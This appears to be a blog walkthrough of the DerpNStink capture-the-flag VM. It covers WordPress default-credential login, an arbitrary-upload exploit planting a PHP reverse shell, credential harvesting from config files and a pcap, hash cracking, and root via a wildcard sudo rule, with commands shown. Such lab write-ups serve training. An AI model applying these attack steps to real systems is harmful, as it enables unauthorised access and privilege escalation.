Today's VM is inspired from the OSCP labs and it has 4 flags to collect.

> Mr. Derp and Uncle Stinky are two system administrators who are starting their own company, DerpNStink. Instead of hiring qualified  professionals to build up their IT landscape, they decided to hack together their own system which is almost ready to go live...

Not too many ports to play with. No available exploit for the FTP. The web server seems unfinished:

{% img center /images/pentest/derpnstink/derpnstink.png 'derpnstink' 'derpnstink' %}

Let's check the robots.txt entries. The php folder gives a Forbidden error and the temporary one just displays a try harder! message. I ran gobuster on the web server and found a couple more entries. The interesting one was a */weblog* folder:

```
/weblog (Status: 301)
```

When I hit that in the browser, it gave me a connection error, but for the derpnstink.local domain. So I added that to my /etc/hosts file and then I was able to connect:

{% img center /images/pentest/derpnstink/weblog.png 'weblog' 'weblog' %}

This is a Wordpress site, so I ran a Wordpress scanner on it and the interesting findings were:

```

```

It seems not much can be done without authentication, so I went to wp-admin and enumerated the username *admin* as a valid user...and in the process also discovered that the password is *admin*..derp! Now I could use an [exploit for the authenticated arbitrary file upload](https://www.exploit-db.com/exploits/34681) with <code>python gallery.py -t http://derpnstink.local/weblog/ -f ~/Desktop/php-reverse-shell.php -u admin -p admin</code>, and you can find the uploaded shell at http://derpnstink.local/weblog//wp-content/uploads/slideshow-gallery/php-reverse-shell.php

From your new shell, if you look inside <code>/var/www/html/weblog/wp-config.php</code>, you can find the MySQL credentials:

```
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'mysql');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```

Inside <code>/var/www/html/php/info.php</code> there is a line stating that there's a PHPMyAdmin interface:

```
/* management interface can be found at /phpmyadmin
```

I went to http://derpnstink.local/php/phpmyadmin/ and used the credentials to get in the wordpress database and get 2 users and hashes:

{% img center /images/pentest/derpnstink/users.png 'users' 'users' %}

We already know the admin credentials, so I used john and the rockyou.txt wordlist to crack the hash and get the password *wedgie57* for user *unclestinky*. My first move was to try SSH'ing in, but public key authentication was configured. That left the FTP, and I was able to log in with the credentials *stinky*:*wedgie57* (there was no unclestinky user configured on the system)

On the FTP, we find a folder with some files that I downloaded on my machine for a better look: <code>wget -r ftp://derpnstink.local/files --ftp-user=stinky --ftp-password=wedgie57</code>

```
ftp> dir

```

Inside network-logs there's a file that hints at some PCAP analysis:

```
cat derpissues.txt
12:06 mrderp: hey i cant login to wordpress anymore. Can you look into it?
12:07 stinky: yeah. did you need a password reset?
12:07 mrderp: I think i accidently deleted my account
12:07 mrderp: i just need to logon once to make a change
12:07 stinky: im gonna packet capture so we can figure out whats going on
12:07 mrderp: that seems a bit overkill, but wtv
12:08 stinky: commence the sniffer!!!!
12:08 mrderp: -_-
12:10 stinky: fine derp, i think i fixed it for you though. cany you try to login?
12:11 mrderp: awesome it works!
12:12 stinky: we really are the best sysadmins #team
12:13 mrderp: i guess we are...
12:15 mrderp: alright I made the changes, feel free to decomission my account
12:20 stinky: done! yay
```

Inside */files/ssh/ssh/ssh/ssh/ssh/ssh/ssh* there's a private key:

Now we can SSH on the box:

stinky@DeRPnStiNK:~$
```

Inside Documents there's the derpissues.pcap file. I ran <code>strings derpissues.pcap | grep pass</code> on it to get another set of credentials:

```
user_login=mrderp
pass1=derpderpderpderpderpderpderp
```

In the /etc/passwd file we can find a mrderp user, so I tried to SSH and got in. On the Desktop, I found a file with a helpdesk ticket about sudo issues:

```

On the root filesystem, I found an interesting folder called /support with more information about this sudo issue:

```
mrderp@DeRPnStiNK:~$ cat /support/troubleshooting.txt
*******************************************************************
On one particular machine I often need to run sudo commands every now and then. I am fine with entering password on sudo in most of the cases.

However i dont want to specify each command to allow

How can I exclude these commands from password protection to sudo?

********************************************************************

Thank you for contacting the Client Support team. This message is to confirm that we have resolved and closed your ticket.

```

Running a **sudo -l** gives us the sudo commands that mrderp can run:

```
User mrderp may run the following commands on DeRPnStiNK:
    (ALL) /home/mrderp/binaries/derpy*
```

All I had to do at this point was to create a binaries directory, copy the bash executable to something with derpy in the name and run it as sudo:

```
mrderp@DeRPnStiNK:~/binaries$ cp -p /bin/bash derpy.sh
mrderp@DeRPnStiNK:~/binaries$ sudo ./derpy.sh
[sudo] password for mrderp:
root@DeRPnStiNK:~/binaries#
```

Only at the end I realized I should have also collected flags, but I was too lazy to return to that, so leaving only the last flag here:

```
root@DeRPnStiNK:/root# cat Desktop/flag.txt
flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)

Congrats on rooting my first VulnOS!
